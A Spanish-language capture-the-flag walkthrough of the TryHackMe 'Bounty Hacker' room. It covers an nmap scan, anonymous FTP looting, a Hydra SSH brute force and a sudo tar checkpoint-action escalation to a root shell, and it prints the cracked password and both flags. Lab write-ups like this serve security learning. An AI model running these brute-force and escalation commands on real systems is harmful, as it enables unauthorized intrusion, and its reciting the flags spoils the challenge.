# Bounty Hacker

## Escaneo de puertos

Realizamos un mapeo de puertos para identificar servicios disponibles con `nmap`:

```bash
sudo nmap -sV -T4 -p- 10.10.85.142
```

Se detectan tres puertos abiertos:

* 21: FTP
* 22: SSH
* 80: HTTP

![](images/image.png)

## Acceso por FTP

Conectamos anónimamente al FTP y desactivamos el modo pasivo para que sea el servidor quien inicie la conexión:

![](images/image-1.png)

Listamos los archivos y los descargamos con `get`:

![](images/image-2.png)

En `task.txt` aparece un usuario llamado `lin`:

![](images/image-3.png)

Y en `locks.txt` varias posibles contraseñas:

![](images/image-4.png)

## Ataque de fuerza bruta con Hydra

Usamos `locks.txt` como diccionario contra SSH para el usuario `lin`:

```bash
hydra -l lin -P locks.txt ssh://10.10.85.142
```

La contraseña obtenida es **RedDr4gonSynd1cat3**.

![](images/image-5.png)

## Acceso por SSH

Accedemos al sistema con `lin`:

```bash
ssh lin@10.10.85.142
```

![](images/image-6.png)

Leemos la flag de usuario en `user.txt`:

![](images/image-7.png)

```
THM{CR1M3_SyNd1C4T3}
```

## Escalada de privilegios

Comprobamos los permisos de sudo del usuario:

```bash
sudo -l
```

![](images/image-8.png)

Vemos que `/bin/tar` puede usarse con privilegios según GTFOBins:

![](images/image-9.png)

Ejecutamos:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

![](images/image-10.png)

Obtenemos shell como root, navegamos a `/root` y leemos la flag:

![](images/image-11.png)

```
THM{80UN7Y_h4cK3r}
```
